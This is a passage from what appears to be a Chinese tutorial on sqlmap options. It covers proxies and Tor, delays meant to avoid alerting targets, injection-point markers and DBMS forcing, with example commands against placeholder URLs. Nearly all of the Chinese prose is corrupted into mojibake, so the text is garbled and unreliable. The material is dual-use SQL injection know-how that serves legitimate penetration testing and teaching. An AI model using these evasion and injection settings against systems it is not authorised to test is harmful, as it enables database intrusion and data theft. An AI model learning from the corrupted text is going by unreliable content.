â€“auth-type Basic â€“auth-cred â€œtestuser:testpassâ€</p><h3 id="2-10-è®¾ç½®-HTTP-ä»£ç†"><a href="#2-10-è®¾ç½®-HTTP-ä»£ç†" class="headerlink" title="2.10 è®¾ç½® HTTP ä»£ç†"></a>2.10 è®¾ç½® HTTP ä»£ç†</h3><p>Sqlmapä¸­è®¾ç½®ä»£ç†çš„å‚æ•°ï¼š â€“proxy, â€“proxy-cred, â€“proxy-file ï¼Œ â€“ignore-proxy</p><p>å…¶ä¸­â€“proxyç”¨æ¥è®¾ç½®HTTPä»£ç†æœåŠ¡å™¨ä½ç½® æ ¼å¼ï¼š â€“proxy http(s): &#x2F;&#x2F;ip[:ç«¯å£]</p><p>â€“proxy-credç”¨æ¥è®¾ç½®HTTPä»£ç†æœåŠ¡å™¨è®¤è¯ä¿¡æ¯ æ ¼å¼ï¼š â€“proxy-cred username:password</p><p>â€“proxy-fileç”¨æ¥è®¾ç½®å¤šæ¡ä»£ç†åœ¨æ–‡ä»¶ä¸­</p><p>â€“ignore-proxyå½“æ‚¨å¸Œæœ›é€šè¿‡å¿½ç•¥ç³»ç»ŸèŒƒå›´å†…çš„HTTP(S)ä»£ç†æœåŠ¡å™¨è®¾ç½®æ¥é’ˆå¯¹æœ¬åœ°ç½‘ç»œçš„ç›®æ ‡éƒ¨åˆ†è¿è¡Œsqlmapæ—¶ï¼Œ åº”è¯¥ä½¿ç”¨è¿™ç§æ–¹æ³•ã€‚</p><h2 id="0x03-sqlmap-è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆäºŒï¼‰"><a href="#0x03-sqlmap-è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆäºŒï¼‰" class="headerlink" title="0x03 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆäºŒï¼‰"></a>0x03 sqlmap è¯·æ±‚å‚æ•°è®¾ç½®ï¼ˆäºŒï¼‰</h2><h3 id="3-1-è®¾ç½®Toréšè—ç½‘ç»œ"><a href="#3-1-è®¾ç½®Toréšè—ç½‘ç»œ" class="headerlink" title="3.1 è®¾ç½®Toréšè—ç½‘ç»œ"></a>3.1 è®¾ç½®Toréšè—ç½‘ç»œ</h3><p>Sqlmapä¸­è®¾ç½®Torç½‘ç»œçš„å‚æ•°ï¼š â€“tor â€“tor-port â€“tor-typeï¼ˆå…±æœ‰å››ç§ç±»å‹ï¼šHTTPã€HTTPSã€SOCKS4ã€SOCKS5ï¼‰ â€“check-tor</p><h3 id="3-2-è®¾ç½®å»¶æ—¶"><a href="#3-2-è®¾ç½®å»¶æ—¶" class="headerlink" title="3.2 è®¾ç½®å»¶æ—¶"></a>3.2 è®¾ç½®å»¶æ—¶</h3><p>Sqlmapæ¢æµ‹è¿‡ç¨‹ä¸­ä¼šå‘é€å¤§é‡æ¢æµ‹Payloadåˆ°ç›®æ ‡ï¼Œ å¦‚æœé»˜è®¤æƒ…å†µè¿‡å¿«çš„å‘åŒ…é€Ÿåº¦å›å¯¼è‡´ç›®æ ‡é¢„è­¦æˆ–æ–­å¼€è¿æ¥ã€‚ ä¸ºäº†é¿å…è¿™æ ·çš„æƒ…å†µå‘ç”Ÿï¼Œ å¯ä»¥åœ¨æ¢æµ‹è®¾ç½®Sqlm1apå‘åŒ…å»¶è¿Ÿã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œ ä¸è®¾ç½®å»¶è¿Ÿã€‚ â€“delay 0.5 è®¾ç½®å»¶è¿Ÿ0.5ç§’</p><h3 id="3-3-è®¾ç½®è¶…æ—¶"><a href="#3-3-è®¾ç½®è¶…æ—¶" class="headerlink" title="3.3 è®¾ç½®è¶…æ—¶"></a>3.3 è®¾ç½®è¶…æ—¶</h3><p>åœ¨è€ƒè™‘è¶…æ—¶HTTP(S)è¯·æ±‚ä¹‹å‰ï¼Œ å¯ä»¥æŒ‡å®šç­‰å¾…çš„ç§’æ•°ã€‚ æœ‰æ•ˆå€¼æ˜¯ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œ ä¾‹å¦‚10.5è¡¨ç¤º10ç§’åŠã€‚ é»˜è®¤è®¾ç½®ä¸º30ç§’ã€‚ ä¾‹å¦‚ï¼š â€“timeout 10.5</p><h3 id="3-4-è®¾ç½®é‡ä¼ æ¬¡æ•°"><a href="#3-4-è®¾ç½®é‡ä¼ æ¬¡æ•°" class="headerlink" title="3.4 è®¾ç½®é‡ä¼ æ¬¡æ•°"></a>3.4 è®¾ç½®é‡ä¼ æ¬¡æ•°</h3><p>â€“retries count è®¾ç½®å¯¹åº”é‡è¯•æ¬¡æ•°ï¼Œ é»˜è®¤æƒ…å†µä¸‹é‡è¯•3æ¬¡ã€‚ï¼ˆé€šå¸¸ä¸è¶…æ—¶å‚æ•°ç»“åˆä½¿ç”¨ï¼‰</p><h3 id="3-5-è®¾ç½®éšæœºåŒ–å‚æ•°"><a href="#3-5-è®¾ç½®éšæœºåŒ–å‚æ•°" class="headerlink" title="3.5 è®¾ç½®éšæœºåŒ–å‚æ•°"></a>3.5 è®¾ç½®éšæœºåŒ–å‚æ•°</h3><p>Sqlmapå¯ä»¥æŒ‡å®šè¦åœ¨æ¯æ¬¡è¯·æ±‚æœŸé—´éšæœºæ›´æ”¹å…¶å€¼çš„å‚æ•°åç§°ã€‚ é•¿åº¦å’Œç±»å‹æ ¹æ®æä¾›çš„åŸå§‹å€¼ä¿æŒä¸€ç›´ã€‚ â€“randomize å‚æ•°åç§°</p><p>ä¾‹å¦‚ï¼š </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020284.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020240.png" alt="img"></p><h3 id="3-6-è®¾ç½®æ—¥å¿—è¿‡æ»¤ç›®æ ‡"><a href="#3-6-è®¾ç½®æ—¥å¿—è¿‡æ»¤ç›®æ ‡" class="headerlink" title="3.6 è®¾ç½®æ—¥å¿—è¿‡æ»¤ç›®æ ‡"></a>3.6 è®¾ç½®æ—¥å¿—è¿‡æ»¤ç›®æ ‡</h3><p>ä¸ä½¿ç”¨é€‰é¡¹-lä½¿ç”¨ä»æä¾›çš„æ—¥å¿—è§£æçš„æ‰€æœ‰ä¸»æœºä¸åŒï¼Œ æ‚¨å¯ä»¥æŒ‡å®šæœ‰æ•ˆçš„Pythonæ­£åˆ™è¡¨è¾¾å¼ï¼Œ ç”¨äºè¿‡æ»¤æ‰€éœ€çš„æ—¥å¿—ã€‚</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -l burp.log â€“scope&#x3D;â€(www)?.target.(com|net|org)â€</p><p>â€“scope&#x3D; â€ æ­£åˆ™è¡¨è¾¾å¼ â€œ</p><h3 id="3-7-è®¾ç½®å¿½ç•¥-401"><a href="#3-7-è®¾ç½®å¿½ç•¥-401" class="headerlink" title="3.7 è®¾ç½®å¿½ç•¥ 401"></a>3.7 è®¾ç½®å¿½ç•¥ 401</h3><p>â€“ignore-401 å‚æ•°ç”¨æ¥å¿½ç•¥æœªéªŒè¯é”™è¯¯ã€‚</p><p>å¦‚æœæ‚¨æƒ³æµ‹è¯•å¶å°”è¿”å›HTTPé”™è¯¯401(æœªç»æˆæƒçš„)çš„ç«™ç‚¹ï¼Œè€Œæ‚¨æƒ³å¿½ç•¥å®ƒå¹¶åœ¨ä¸æä¾›é€‚å½“å‡­è¯çš„æƒ…å†µä¸‹ç»§ç»­æµ‹è¯•ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨â€“ignore-401</p><h3 id="3-8-è®¾ç½®-HTTP-åè®®ç§é’¥"><a href="#3-8-è®¾ç½®-HTTP-åè®®ç§é’¥" class="headerlink" title="3.8 è®¾ç½® HTTP åè®®ç§é’¥"></a>3.8 è®¾ç½® HTTP åè®®ç§é’¥</h3><p>å½“webæœåŠ¡å™¨éœ€è¦é€‚å½“çš„å®¢æˆ·ç«¯è¯ä¹¦å’Œç”¨äº<a href="https://cloud.tencent.com/product/faceid?from_column=20065&from=20065">èº«ä»½éªŒè¯</a>çš„ç§é’¥æ—¶ï¼Œåº”è¯¥ä½¿ç”¨æ­¤é€‰é¡¹ã€‚æä¾›çš„å€¼åº”è¯¥æ˜¯ä¸€ä¸ªPEMæ ¼å¼çš„key_fileï¼Œå…¶ä¸­åŒ…å«è¯ä¹¦å’Œç§é’¥ã€‚</p><p>â€“auth-file æ–‡ä»¶å</p><h3 id="3-9-è®¾ç½®å®‰å…¨æ¨¡å¼"><a href="#3-9-è®¾ç½®å®‰å…¨æ¨¡å¼" class="headerlink" title="3.9 è®¾ç½®å®‰å…¨æ¨¡å¼"></a>3.9 è®¾ç½®å®‰å…¨æ¨¡å¼</h3><p>é¿å…åœ¨å¤šæ¬¡è¯·æ±‚å¤±è´¥åé”€æ¯ä¼šè¯</p><p>æœ‰æ—¶ï¼Œå¦‚æœæ‰§è¡Œäº†ä¸€å®šæ•°é‡çš„ä¸æˆåŠŸè¯·æ±‚ï¼Œåˆ™åœ¨æ­¤æœŸé—´çš„webåº”ç”¨ç¨‹åºæˆ–æ£€æŸ¥æŠ€æœ¯ä¼šé”€æ¯ä¼šè¯ã€‚è¿™å¯èƒ½å‘ç”Ÿåœ¨sqlmapçš„æ£€æµ‹é˜¶æ®µæˆ–åˆ©ç”¨ä»»ä½•ç›²SQLæ³¨å…¥ç±»å‹æ—¶ã€‚åŸå› æ˜¯SQLæœ‰æ•ˆè´Ÿè½½ä¸ä¸€å®šè¿”å›è¾“å‡ºï¼Œå› æ­¤å¯èƒ½ä¼šå‘åº”ç”¨ç¨‹åºä¼šè¯ç®¡ç†æˆ–æ£€æŸ¥æŠ€æœ¯å‘å‡ºä¿¡å·ã€‚</p><p>â€“safe-url, â€“safe-post, â€“safe-req â€“safe-freq</p><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œsqlmapå°†è®¿é—®æ¯ä¸ªé¢„å®šä¹‰æ•°é‡çš„è¯·æ±‚ï¼Œè€Œä¸å¯¹æŸä¸ªå®‰å…¨URLæ‰§è¡Œä»»ä½•ç±»å‹çš„æ³¨å…¥ã€‚</p><h3 id="3-10-è®¾ç½®å¿½ç•¥URLç¼–ç "><a href="#3-10-è®¾ç½®å¿½ç•¥URLç¼–ç " class="headerlink" title="3.10 è®¾ç½®å¿½ç•¥URLç¼–ç "></a>3.10 è®¾ç½®å¿½ç•¥URLç¼–ç </h3><p>æ®å‚æ•°çš„ä½ç½®(ä¾‹å¦‚GET)ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒçš„å€¼å¯ä»¥æ˜¯URLç¼–ç çš„ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåç«¯webæœåŠ¡å™¨ä¸éµå¾ªRFCæ ‡å‡†ï¼Œéœ€è¦ä»¥åŸå§‹çš„éç¼–ç å½¢å¼å‘é€å€¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨â€“skip-urlencodeã€‚</p><p>â€“skip-urlencode ä¸è¿›è¡ŒURLåŠ å¯†</p><h2 id="0x04-sqlmap-æ€§èƒ½ä¼˜åŒ–"><a href="#0x04-sqlmap-æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="0x04 sqlmap æ€§èƒ½ä¼˜åŒ–"></a>0x04 sqlmap æ€§èƒ½ä¼˜åŒ–</h2><h3 id="4-1-è®¾ç½®æŒä¹…-HTTP-è¿æ¥"><a href="#4-1-è®¾ç½®æŒä¹…-HTTP-è¿æ¥" class="headerlink" title="4.1 è®¾ç½®æŒä¹… HTTP è¿æ¥"></a>4.1 è®¾ç½®æŒä¹… HTTP è¿æ¥</h3><p>Sqlmapä¸­å¯ä»¥è®¾ç½®è¿æ¥ä¸ºæŒä¹…è¿æ¥ã€‚ HTTPæŠ¥æ–‡ä¸­è®¾ç½® Connection: Keep-Aliveã€‚ï¼ˆé€šè¿‡å‡å°‘è¿æ¥æ¬¡æ•°æ¥æå‡æ€§èƒ½ï¼‰ å‚æ•°ï¼š â€“keep-alive æ³¨æ„è¯¥å‚æ•°ä¸ -proxyå‚æ•°ä¸å…¼å®¹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022449.png" alt="img"></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-8223537/8ebeb446b4b0bc8fb88b0ec56e7f5048.png" alt="img"></p><h3 id="4-2-è®¾ç½®-HTTP-ç©ºè¿æ¥"><a href="#4-2-è®¾ç½®-HTTP-ç©ºè¿æ¥" class="headerlink" title="4.2 è®¾ç½® HTTP ç©ºè¿æ¥"></a>4.2 è®¾ç½® HTTP ç©ºè¿æ¥</h3><p>Sqlmapä¸­è®¾ç½®ç©ºè¿æ¥ï¼Œ è¡¨ç¤ºç›´æ¥è·å¾—HTTPå“åº”çš„å¤§å°è€Œä¸ç”¨è·å¾—HTTPå“åº”ä½“ã€‚ å¸¸ç”¨åœ¨ç›²æ³¨åˆ¤æ–­çœŸ&#x2F;å‡ä¸­ï¼Œé™ä½ç½‘ç»œå¸¦å®½æ¶ˆè€—ã€‚ å‚æ•°ï¼š â€“null-connection æ³¨æ„è¿™ä¸ªå‚æ•°ï¼Œä¸â€“text-onlyå‚æ•°ä¸å…¼å®¹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020235.png" alt="img"></p><h3 id="4-3-è®¾ç½®å¤šçº¿ç¨‹"><a href="#4-3-è®¾ç½®å¤šçº¿ç¨‹" class="headerlink" title="4.3 è®¾ç½®å¤šçº¿ç¨‹"></a>4.3 è®¾ç½®å¤šçº¿ç¨‹</h3><p>Sqlmapä¸­è®¾ç½®åŒæ—¶å‘é€å¤šå°‘ä¸ªHTTPè¯·æ±‚çš„å¤šçº¿ç¨‹ã€‚</p><p>â€“threads é»˜è®¤æ˜¯1ä¸ªçº¿ç¨‹ã€‚ ä¸ºäº†ä¸å½±å“ç›®æ ‡ç«™ç‚¹æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œ Sqlmapå¯ä»¥è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°ä¸º10ã€‚</p><h3 id="4-5-è®¾ç½®é¢„æµ‹è¾“å‡º"><a href="#4-5-è®¾ç½®é¢„æµ‹è¾“å‡º" class="headerlink" title="4.5 è®¾ç½®é¢„æµ‹è¾“å‡º"></a>4.5 è®¾ç½®é¢„æµ‹è¾“å‡º</h3><p>Sqlmapä¸­çš„é¢„æµ‹è¾“å‡ºï¼Œ åœ¨æ¨ç†ç®—æ³•ä¸­ç”¨äºæ£€ç´¢å€¼å­—ç¬¦çš„é¡ºåºç»Ÿè®¡é¢„æµ‹ã€‚ å‚æ•°ï¼š â€“predict-output</p><p>æ³¨æ„è¿™ä¸ªå‚æ•°ä¸ â€“threadå‚æ•°ä¸å…¼å®¹ã€‚</p><p><em><strong>ä½¿ç”¨ -o å‚æ•°å¯å¼€å¯å‰é¢ä¸‰ä¸ªæ€§èƒ½å‚æ•°ï¼ˆâ€“keep-alive ã€â€“null-connection ã€ â€“predict-outputï¼‰ï¼Œä¸å¼€å¯ â€“threadså‚æ•°</strong></em></p><h2 id="0x05-sqlmap-æ³¨å…¥ä½ç½®ä»‹ç»"><a href="#0x05-sqlmap-æ³¨å…¥ä½ç½®ä»‹ç»" class="headerlink" title="0x05 sqlmap æ³¨å…¥ä½ç½®ä»‹ç»"></a>0x05 sqlmap æ³¨å…¥ä½ç½®ä»‹ç»</h2><h3 id="5-0-æ³¨å…¥ä»‹ç»"><a href="#5-0-æ³¨å…¥ä»‹ç»" class="headerlink" title="5.0 æ³¨å…¥ä»‹ç»"></a>5.0 æ³¨å…¥ä»‹ç»</h3><p>æ‰€è°“SQLæ³¨å…¥ï¼Œ å°±æ˜¯é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°Webè¡¨å•æäº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œ æœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚ å…·ä½“æ¥è¯´ï¼Œ å®ƒæ˜¯åˆ©ç”¨ç°æœ‰åº”ç”¨ç¨‹åºï¼Œ å°†ï¼ˆæ¶æ„çš„ï¼‰ SQLå‘½ä»¤æ³¨å…¥åˆ°åå°æ•°æ®åº“å¼•æ“æ‰§è¡Œçš„èƒ½åŠ›ï¼Œ å®ƒå¯ä»¥é€šè¿‡åœ¨Webè¡¨å•ä¸­è¾“å…¥ï¼ˆæ¶æ„ï¼‰ SQLè¯­å¥å¾—åˆ°ä¸€ä¸ªå­˜åœ¨å®‰å…¨æ¼æ´çš„ç½‘ç«™ä¸Šçš„æ•°æ®åº“ï¼Œ è€Œä¸æ˜¯æŒ‰ç…§è®¾è®¡è€…æ„å›¾å»æ‰§è¡ŒSQLè¯­å¥ã€‚</p><p>ç”±æ­¤å¯è§ï¼š SQLæ³¨å…¥å‘ç”Ÿä½ç½® HTTPæ•°æ®åŒ…ä¸­ä»»æ„ä½ç½®</p><h3 id="5-1-è®¾ç½®æŒ‡å®šæ³¨å…¥å‚æ•°"><a href="#5-1-è®¾ç½®æŒ‡å®šæ³¨å…¥å‚æ•°" class="headerlink" title="5.1 è®¾ç½®æŒ‡å®šæ³¨å…¥å‚æ•°"></a>5.1 è®¾ç½®æŒ‡å®šæ³¨å…¥å‚æ•°</h3><p>Sqlmapæµ‹è¯•å‚æ•° -p, â€“skip â€“param-exclude â€“skip-static</p><p>-p ï¼š æŒ‡å®šå…·ä½“æ¢æµ‹çš„å‚æ•°ã€‚ ä¾‹å¦‚ï¼š -p â€œid,user-agentâ€</p><p>â€“skipï¼š å¿½ç•¥æ¢æµ‹å…·ä½“çš„å‚æ•°ã€‚ ä¾‹å¦‚ï¼š â€“level â€“skip â€œuser-agent,refererâ€</p><p>â€“param-excludeï¼š å¿½ç•¥åŒ…å«å…·ä½“å†…å®¹çš„å‚æ•°ã€‚ ä¾‹å¦‚ï¼š â€“param-exclude&#x3D;â€œtoken|sessionâ€ ä¸å¯¹åŒ…å«tokenæˆ–sessionçš„å‚æ•°è¿›è¡Œæ¢æµ‹ã€‚</p><p>â€“skip-staticï¼š å¿½ç•¥éåŠ¨æ€å‚æ•°</p><h3 id="5-2-è®¾ç½®URLæ³¨å…¥ä½ç½®"><a href="#5-2-è®¾ç½®URLæ³¨å…¥ä½ç½®" class="headerlink" title="5.2 è®¾ç½®URLæ³¨å…¥ä½ç½®"></a>5.2 è®¾ç½®URLæ³¨å…¥ä½ç½®</h3><p>å½“æ³¨å…¥ç‚¹ä½äºURLæœ¬èº«å†…éƒ¨æ—¶ï¼Œ ä¼šå‡ºç°ä¸€äº›ç‰¹æ®Šæƒ…å†µã€‚ é™¤éæ‰‹åŠ¨æŒ‡å‘URLè·¯å¾„ï¼Œ å¦åˆ™sqlmapä¸ä¼šå¯¹URLè·¯å¾„æ‰§è¡Œä»»ä½•è‡ªåŠ¨æµ‹è¯•ã€‚ å¿…é¡»åœ¨å‘½ä»¤è¡Œä¸­æ·»åŠ æ˜Ÿå·(*)æ¥æŒ‡å®šè¿™äº›æ³¨å…¥ç‚¹ã€‚</p><p>ä¾‹å¦‚ï¼Œ å½“ä½¿ç”¨Apache webæœåŠ¡å™¨çš„mod_rewriteæ¨¡å—æˆ–å…¶ä»–ç±»ä¼¼çš„æŠ€æœ¯æ—¶ï¼Œ è¿™å°±æ˜¾å¾—ç‰¹åˆ«æœ‰ç”¨äº†</p><p>python sqlmap.py -u <a href="http://targeturl/param1/value1*/param2/value2/">http://targeturl/param1/value1*/param2/value2/</a></p><h3 id="5-3-è®¾ç½®ä»»æ„æ³¨å…¥ä½ç½®"><a href="#5-3-è®¾ç½®ä»»æ„æ³¨å…¥ä½ç½®" class="headerlink" title="5.3 è®¾ç½®ä»»æ„æ³¨å…¥ä½ç½®"></a>5.3 è®¾ç½®ä»»æ„æ³¨å…¥ä½ç½®</h3><p>ä¸URLæ³¨å…¥ç‚¹ç±»ä¼¼ï¼Œ æ˜Ÿå·(*)(æ³¨æ„:è¿™é‡Œä¹Ÿæ”¯æŒHavijæ ·å¼%INJECT %)ä¹Ÿå¯ä»¥ç”¨æ¥æŒ‡å‘GETã€POSTæˆ–HTTPå¤´ä¸­çš„ä»»æ„æ³¨å…¥ç‚¹ã€‚ æ³¨å…¥ç‚¹å¯ä»¥é€šè¿‡åœ¨å¸¦æœ‰é€‰é¡¹-uçš„GETå‚æ•°å€¼ã€ å¸¦æœ‰é€‰é¡¹â€“dataæ•°æ®çš„POSTå‚æ•°å€¼ã€ å¸¦æœ‰é€‰é¡¹-Hçš„HTTPï¼ˆheaderï¼‰å¤´å€¼ã€ å¸¦æœ‰é€‰é¡¹-Açš„User_Agentå¤´ã€ ç”¨æˆ·ä»£ç†ã€ å¼•ç”¨å’Œ&#x2F;æˆ–cookieçš„HTTPå¤´å€¼ä¸­æŒ‡å®šï¼Œ æˆ–è€…åœ¨å¸¦æœ‰é€‰é¡¹-rçš„æ–‡ä»¶ä¸­åŠ è½½çš„HTTPè¯·æ±‚çš„é€šç”¨ä½ç½®æŒ‡å®šã€‚</p><p>python sqlmap.py -u â€œ<a href="http://targeturlâ€/">http://targeturlâ€</a> â€“cookie&#x3D;â€param1&#x3D;value1*;param2&#x3D;value2</p><h2 id="0x06-sqlmap-æ³¨å…¥å‚æ•°"><a href="#0x06-sqlmap-æ³¨å…¥å‚æ•°" class="headerlink" title="0x06 sqlmap æ³¨å…¥å‚æ•°"></a>0x06 sqlmap æ³¨å…¥å‚æ•°</h2><h3 id="6-1-å¼ºåˆ¶è®¾ç½®-DBMS"><a href="#6-1-å¼ºåˆ¶è®¾ç½®-DBMS" class="headerlink" title="6.1 å¼ºåˆ¶è®¾ç½® DBMS"></a>6.1 å¼ºåˆ¶è®¾ç½® DBMS</h3><p>é»˜è®¤æƒ…å†µä¸‹Sqlmapä¼šè‡ªåŠ¨è¯†åˆ«æ¢æµ‹ç›®æ ‡Webåº”ç”¨ç¨‹åºçš„åç«¯<a href="https://cloud.tencent.com/product/dmc?from_column=20065&from=20065">æ•°æ®åº“ç®¡ç†</a>ç³»ç»Ÿï¼ˆDBMSï¼‰ ï¼Œ ä»¥ä¸‹åˆ—å‡º</p><p>Sqlmapå®Œå…¨æ”¯æŒçš„DBMSç§ç±»ï¼š</p><p>Mysqlã€ Oracleã€ Microsoft SQL Serverã€ IBM DB2ã€ SQLiteã€ Firebirdã€ Sybaseã€ SAP MaxDBã€HSQLDBã€ Informix</p><p>â€“dbms æ•°æ®åº“ç®¡ç†ç³»ç»Ÿåç§° [ç‰ˆæœ¬å·]</p><p>ä¾‹å¦‚ï¼š â€“dbms mysql 5.0 ã€ â€“dbms microsoft sql server 05</p><h3 id="6-2-å¼ºåˆ¶è®¾ç½®-OS"><a href="#6-2-å¼ºåˆ¶è®¾ç½®-OS" class="headerlink" title="6.2 å¼ºåˆ¶è®¾ç½® OS"></a>6.2 å¼ºåˆ¶è®¾ç½® OS</h3><p>é»˜è®¤æƒ…å†µä¸‹Sqlmapä¼šè‡ªåŠ¨è¯†åˆ«æ¢æµ‹ç›®æ ‡Webåº”ç”¨ç¨‹åºçš„åç«¯æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰ ï¼Œ ä»¥ä¸‹åˆ—å‡ºSqlmapå®Œå…¨æ”¯æŒçš„OSç§ç±»ã€‚ Linux ã€ Windows</p><p>è¯·æ³¨æ„ï¼Œ æ­¤é€‰é¡¹ä¸æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œ å¼ºçƒˆå»ºè®®åªåœ¨å®Œå…¨ç¡®å®šåº•å±‚æ“ä½œç³»ç»Ÿçš„åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ—¶æ‰ä½¿ç”¨å®ƒã€‚ å¦‚æœä¸çŸ¥é“å®ƒï¼Œ è®©sqlmapè‡ªåŠ¨ä¸ºæ‚¨è¯†åˆ«å®ƒã€‚ ä¾‹å¦‚ï¼š â€“os windows æˆ– â€“os linux</p><p>è¯·æ³¨æ„ï¼Œ æ­¤é€‰é¡¹ä¸æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œ å¼ºçƒˆå»ºè®®åªåœ¨å®Œå…¨ç¡®å®šåº•å±‚æ“ä½œç³»ç»Ÿçš„åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ—¶æ‰ä½¿ç”¨å®ƒã€‚ å¦‚æœä¸çŸ¥é“å®ƒï¼Œ è®©sqlmapè‡ªåŠ¨ä¸ºæ‚¨è¯†åˆ«å®ƒã€‚</p><h3 id="6-3-å…³é—­è´Ÿè½½è½¬æ¢æœºåˆ¶"><a href="#6-3-å…³é—­è´Ÿè½½è½¬æ¢æœºåˆ¶" class="headerlink" title="6.3 å…³é—­è´Ÿè½½è½¬æ¢æœºåˆ¶"></a>6.3 å…³é—­è´Ÿè½½è½¬æ¢æœºåˆ¶</h3><p>åœ¨æ£€ç´¢ç»“æœæ—¶ï¼Œ sqlmapä½¿ç”¨ä¸€ç§æœºåˆ¶ï¼Œ åœ¨è¿™ç§æœºåˆ¶ä¸­ï¼Œ æ‰€æœ‰æ¡ç›®éƒ½è¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œ å¹¶åœ¨NULLå€¼çš„æƒ…å†µä¸‹ç”¨ç©ºæ ¼å­—ç¬¦æ›¿æ¢ã€‚ è¿™æ ·åšæ˜¯ä¸ºäº†é˜²æ­¢å‡ºç°ä»»ä½•é”™è¯¯çŠ¶æ€(ä¾‹å¦‚ï¼Œ å°†ç©ºå€¼ä¸å­—ç¬¦ä¸²å€¼è¿æ¥èµ·æ¥)ï¼Œ å¹¶ç®€åŒ–æ•°æ®æ£€ç´¢è¿‡ç¨‹æœ¬èº«ã€‚ å°½ç®¡å¦‚æ­¤ï¼Œ è¿˜æ˜¯æœ‰æŠ¥å‘Šçš„æ¡ˆä¾‹(ä¾‹å¦‚MySQL DBMSçš„æ—§ç‰ˆæœ¬)ç”±äºæ•°æ®æ£€ç´¢æœ¬èº«çš„é—®é¢˜(ä¾‹å¦‚æ²¡æœ‰è¿”å›å€¼)éœ€è¦å…³é—­è¿™ç§æœºåˆ¶(ä½¿ç”¨æ­¤å¼€å…³)ã€‚</p><p>â€“no-cast</p><h3 id="6-4-å…³é—­å­—ç¬¦è½¬ä¹‰æœºåˆ¶"><a href="#6-4-å…³é—­å­—ç¬¦è½¬ä¹‰æœºåˆ¶" class="headerlink" title="6.4 å…³é—­å­—ç¬¦è½¬ä¹‰æœºåˆ¶"></a>6.4 å…³é—­å­—ç¬¦è½¬ä¹‰æœºåˆ¶</h3><p>åœ¨sqlmapéœ€è¦åœ¨æœ‰æ•ˆè´Ÿè½½ä¸­ä½¿ç”¨(å•å¼•å·åˆ†éš”)å­—ç¬¦ä¸²å€¼(ä¾‹å¦‚ï¼Œ é€‰æ‹©â€™foobarâ€™)æ—¶ï¼Œ è¿™äº›å€¼å°†è‡ªåŠ¨è½¬ä¹‰(ä¾‹å¦‚ï¼Œ é€‰æ‹©CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))ã€‚è¿™æ ·åšçš„åŸå› æœ‰ä¸¤ä¸ª:æ··æ·†æœ‰æ•ˆè´Ÿè½½å†…å®¹å’Œé˜²æ­¢åç«¯æœåŠ¡å™¨ä¸ŠæŸ¥è¯¢è½¬ä¹‰æœºåˆ¶(ä¾‹å¦‚magic_quoteså’Œ&#x2F;æˆ–mysql_real_escape_string)çš„æ½œåœ¨é—®é¢˜ã€‚ ç”¨æˆ·å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¼€å…³å…³é—­å®ƒ(ä¾‹å¦‚å‡å°‘æœ‰æ•ˆè´Ÿè½½å¤§å°)ã€‚</p><p>â€“no-escapeï¼ˆä¸€èˆ¬ä¸å»ºè®®å…³é—­ï¼‰</p><h3 id="6-5-å¼ºåˆ¶è®¾ç½®æ— æ•ˆå€¼æ›¿æ¢"><a href="#6-5-å¼ºåˆ¶è®¾ç½®æ— æ•ˆå€¼æ›¿æ¢" class="headerlink" title="6.5 å¼ºåˆ¶è®¾ç½®æ— æ•ˆå€¼æ›¿æ¢"></a>6.5 å¼ºåˆ¶è®¾ç½®æ— æ•ˆå€¼æ›¿æ¢</h3><p>åœ¨sqlmapéœ€è¦ä½¿åŸå§‹å‚æ•°å€¼æ— æ•ˆ(ä¾‹å¦‚id&#x3D;13)æ—¶ï¼Œå®ƒä½¿ç”¨ç»å…¸çš„å¦å®š(ä¾‹å¦‚id&#x3D;-13)ã€‚æœ‰äº†è¿™ä¸ªå¼€å…³ï¼Œå°±å¯ä»¥å¼ºåˆ¶ä½¿ç”¨å¤§æ•´æ•°å€¼æ¥å®ç°ç›¸åŒçš„ç›®æ ‡(ä¾‹å¦‚id&#x3D;99999999)ã€‚ â€“invalid-bignum</p><p>åœ¨sqlmapéœ€è¦ä½¿åŸå§‹å‚æ•°å€¼æ— æ•ˆ(ä¾‹å¦‚id&#x3D;13)æ—¶ï¼Œå®ƒä½¿ç”¨ç»å…¸çš„å¦å®š(ä¾‹å¦‚id&#x3D;-13)ã€‚æœ‰äº†è¿™ä¸ªå¼€å…³ï¼Œå°±å¯ä»¥å¼ºåˆ¶ä½¿ç”¨å¸ƒå°”æ“ä½œæ¥å®ç°ç›¸åŒçš„ç›®æ ‡(ä¾‹å¦‚id&#x3D;13 and18&#x3D;19)ã€‚ 